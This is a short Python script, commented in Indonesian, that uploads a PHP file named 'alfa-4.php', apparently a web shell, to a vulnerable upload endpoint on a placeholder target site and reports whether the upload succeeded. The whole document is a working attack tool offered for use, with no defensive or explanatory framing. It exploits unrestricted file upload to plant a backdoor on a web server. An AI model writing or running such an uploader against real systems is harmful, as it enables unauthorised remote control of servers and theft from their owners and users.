import requests

def upload_shell(url, shell_path):
    with open(shell_path, 'rb') as f:
        files = {'file': f}
        response = requests.post(url, files=files)
        if response.status_code == 200:
            print("Shell berhasil diupload!")
        else:
            print(f"Gagal upload shell, status code: {response.status_code}")

if __name__ == "__main__":
    target_url = "http://target.com/upload.php"  # URL upload yang rentan
    shell_file = "alfa-4.php"  # file shell yang ingin diupload
    upload_shell(target_url, shell_file)
